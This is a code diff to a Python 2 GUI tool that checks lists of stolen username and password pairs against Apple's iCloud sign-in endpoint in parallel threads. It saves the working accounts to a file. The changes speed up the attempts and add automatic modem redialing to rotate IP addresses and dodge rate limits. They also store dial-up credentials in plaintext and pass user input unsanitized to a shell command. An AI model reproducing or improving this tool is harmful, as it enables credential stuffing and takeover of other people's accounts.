@@ -2,6 +2,7 @@
 import Tkinter as tk
 import tkMessageBox
 import tkFont
+import os
 import requests
 import threading
 import Queue
@@ -41,20 +42,20 @@ class FileHandle:
         tk.Label(new_frame2, text=u'账号: ').grid(row=1, column=0, sticky=tk.W)
         tk.Entry(new_frame2, textvariable=self.username).grid(row=1, column=1, sticky=tk.W)
         tk.Label(new_frame2, text=u'  每操作(个): ').grid(row=1, column=3, sticky=tk.W)
-        tk.Entry(new_frame2, textvariable=self.num1, width=3).grid(row=1, column=4, sticky=tk.W)
-        self.num1.set(10)
+        tk.Entry(new_frame2, textvariable=self.num1, width=5).grid(row=1, column=4, sticky=tk.W)
+        self.num1.set(100)
         tk.Label(new_frame2, text=u'   每条线程暂停登陆(秒): ').grid(row=1, column=5, sticky=tk.W)
         tk.Entry(new_frame2, textvariable=self.passue, width=4).grid(row=1, column=6, sticky=tk.W)
-        self.passue.set(3)
+        self.passue.set(1)
 
         tk.Label(new_frame2, text=u'密码: ').grid(row=2, column=0, sticky=tk.W)
         tk.Entry(new_frame2, textvariable=self.passwd).grid(row=2, column=1, sticky=tk.W)
         tk.Label(new_frame2, text=u'  每操作(个): ').grid(row=2, column=3, sticky=tk.W)
-        tk.Entry(new_frame2, textvariable=self.num2, width=3).grid(row=2, column=4, sticky=tk.W)
-        self.num2.set(50)
+        tk.Entry(new_frame2, textvariable=self.num2, width=5).grid(row=2, column=4, sticky=tk.W)
+        self.num2.set(500)
         tk.Label(new_frame2, text=u'  断开并重新拨号等待(秒): ').grid(row=2, column=5, sticky=tk.W)
         tk.Entry(new_frame2, textvariable=self.wait_dial, width=4).grid(row=2, column=6, sticky=tk.W)
-        self.wait_dial.set(5)
+        self.wait_dial.set(1)
         tk.Button(new_frame2, text=u'拨号', font=ft, command=self.dial_call).grid(row=1, column=7, rowspan=2, columnspan=2, sticky=tk.W)
 
         # # 分隔符相关
@@ -93,9 +94,23 @@ class FileHandle:
         self.right_file.grid(row=0, column=2, sticky=tk.W)
         self.wrong_file = tk.Label(new_frame4, text=u'错误结果保存:    ')
         self.wrong_file.grid(row=0, column=3, sticky=tk.W)
+        if os.path.exists('dia_record.txt'):
+            user, passwd = open('dia_record.txt').read().strip().split()
+            self.username.set(user)
+            self.passwd.set(passwd)
 
     def dial_call(self):
-        self.ip_set['text'] = u'拨号设置:有啦, 你这傻逼'
+        with open('dia_record.txt') as f:
+            f.write('%s %s' % (self.username.get(), self.passwd.get()))
+
+        name = "宽带连接"
+        cmd_str = "rasdial %s %s %s" % (name, self.username.get(), self.passwd.get())
+        res = os.system(cmd_str)
+        if res == 0:
+            print u"connect successful"
+            self.ip_set['text'] = u'拨号设置 :已连接'
+        else:
+            tkMessageBox.showerror(message=u'登陆失败')
 
     def form_check(self):
         if not self.read_file:
@@ -131,7 +146,9 @@ class FileHandle:
                 handle_wait=int(self.num1.get()),
                 dia_num=int(self.num2.get()),
                 dia_wait=int(self.wait_dial.get()),
-                ip_set=self.ip_set
+                ip_set=self.ip_set,
+                dia_user=self.username.get(),
+                dia_pass=self.passwd.get()
                 )
             result = [
                 self.tb, self.line_num, self.write_num,
@@ -150,17 +167,21 @@ class IcloudScan:
     """
     According the Txt to check avaliabled
     """
-    def __init__(self, file_fd, thread_num=5, wait=0, handle_wait=10, dia_num=50, dia_wait=0, ip_set=None):
+    def __init__(
+            self, file_fd, thread_num=5, wait=0,
+            handle_wait=10, dia_num=50, dia_wait=0, ip_set=None, dia_user=None, dia_pass=None):
         self.url = 'https://idmsa.apple.com/appleauth/auth/signin'
         self.file = file_fd
         self.ip_set = ip_set
+        self.dia_user = dia_user
+        self.dia_pass = dia_pass
         self.dia_num = dia_num
         self.dia_wait = dia_wait
         self.line_num = 0
         self.network_stat = 1
         self.handle_wait = handle_wait
         self.wait = wait
-        self.right = open('%s result-right.txt' % self.file.name, 'w')
+        self.right = open('%s -py_OK-OK-OK.txt' % self.file.name, 'w')
         self.wrong = open('%s result-error.txt' % self.file.name, 'w')
         self.thread_num = thread_num
         self.read_queue = Queue.Queue()
@@ -182,13 +203,13 @@ class IcloudScan:
             'Accept-Language': 'zh-CN,zh;q=0.8',
         })
 
-    def read_file(self, tk_line_total):
+    def read_file(self):
         self.file.seek(0)
         for line in self.file:
             self.line_num += 1
             self.read_queue.put(line)
 
-        tk_line_total['text'] = u'文件总数: %s  ' % self.line_num
+        #
 
     def run(self, delimiter, wait, handle_wait):
         num = 1
@@ -197,15 +218,13 @@ class IcloudScan:
             if not self.read_queue.empty():
                 if self.network_stat:
                     line = self.read_queue.get(timeout=5)
-                    print 200, num, flag
                     if num % handle_wait == 0:
                         print u'访问 %s 次, 暂停登陆 %s s' % (handle_wait, wait)
-                        print num
                         time.sleep(wait)
                     if line:
                         line = line.strip()
                         if delimiter in line:
-                            username, passwd = line.split(delimiter)
+                            username, passwd = line.split(delimiter)[:2]
                         else:
                             username, passwd = line.split()[:2]
                     num += 1
@@ -215,7 +234,7 @@ class IcloudScan:
                         'rememberMe': 'false',
                         'trustTokens': []
                     })
-                    while flag < 4:
+                    while flag < 3:
                         try:
                             result = json.loads(
                                 self.html.post(
@@ -224,48 +243,63 @@ class IcloudScan:
                                     verify=True
                                 ).text
                             )
-                            flag = 4
+
                         except requests.exceptions.ConnectionError:
                             print '[Error]: The %s time to try again!' % flag
-
-                        message = u'账号: %-25s 密码: %-15s ' % (username, passwd)
-                        if 'serviceErrors' in result:
-                            tmp_result = result['serviceErrors'][0]
-                            self.write_queue.put((
-                                self.wrong,
-                                message + u'不正确 错误代码: %s 错误信息: %s \n' % (
-                                    tmp_result['code'],
-                                    tmp_result['message']
-                                )))
-                        elif not result:
-                            self.write_queue.put((
-                                self.right,
-                                message + u'正确\n'
-                            ))
-
+                            flag += 1
+                        else:
+                            flag = 4
+                            message = u'账号: %-25s 密码: %-15s ' % (username, passwd)
+                            if 'serviceErrors' in result:
+                                tmp_result = result['serviceErrors'][0]
+                                self.write_queue.put((
+                                    self.wrong,
+                                    message + u'不正确 错误代码: %s 错误信息: %s \n' % (
+                                        tmp_result['code'],
+                                        tmp_result['message']
+                                    )))
+                            elif not result:
+                                self.write_queue.put((
+                                    self.right,
+                                    message + u'正确\n'
+                                ))
                     flag = 1
                 else:
+                    print self.network_stat
                     print u'网络断开 暂停 %s s' % self.dia_wait
                     time.sleep(self.dia_wait)
             else:
                 break
 
     def call_network(self):
-        time.sleep(self.dia_wait)
-        self.ip_set['text'] = u'拨号设置:已经更改'
-        self.network_stat = 1
+        print '\n\n\n'
+        name = "宽带连接"
+        res = os.system("rasdial %s /disconnect" % name)
+        if res == 0:
+            print u'拨号设置 IP: 已断开, 等待 %ss 重连' % self.dia_wait
+            time.sleep(self.dia_wait)
 
+        cmd_str = "rasdial %s %s %s" % (name, self.dia_user, self.dia_pass)
+        res = os.system(cmd_str)
+        if res == 0:
+            print "connect successful"
+            try:
+                ip = requests.get('http://ident.me').text
+                print u'拨号设置 IP: %s\n\n' % ip
+            except:
+                print u'IP已更改 \n\n'
+        else:
+            tkMessageBox.showerror(message=u'登陆失败')
 
-
-    def write_log(self, tb, write_num, right_file, wrong_file):
+    def write_log(self, tb, write_num, right_file, wrong_file, tk_line_total):
         tb.delete(0.0, tk.END)
         line = 1
         while 1:
             try:
                 if line % self.dia_num == 0:
-                    self.network_stat = 0
+                    self.network_stat = 1
                     self.call_network()
-                fd, message = self.write_queue.get(timeout=5)
+                fd, message = self.write_queue.get(timeout=25)
 
                 line += 1
                 print message,
@@ -274,21 +308,22 @@ class IcloudScan:
                 tb.see(tk.END)
                 fd.write(message.encode('utf8'))
             except Queue.Empty:
+                print 'write quit'
                 break
 
+        tk_line_total['text'] = u'文件总数: %s  ' % self.line_num
         right_file['text'] = u'可登录结果保存:  %s | ' % self.right.name
         wrong_file['text'] = u'错误结果保存:  %s  ' % self.wrong.name
         write_num['text'] = u'已写入: %s    ' % line
 
     def main(self, para_set):
         tb, total_line, write_num, right_file, wrong_file, delimiter = para_set
-
         thread_list = []
         thread_list.append(
-            threading.Thread(target=self.read_file, args=(total_line,))
+            threading.Thread(target=self.read_file)
         )
         thread_list.append(
-            threading.Thread(target=self.write_log, args=(tb, write_num, right_file, wrong_file))
+            threading.Thread(target=self.write_log, args=(tb, write_num, right_file, wrong_file, total_line))
         )
         for tn in range(self.thread_num):
             thread_list.append(
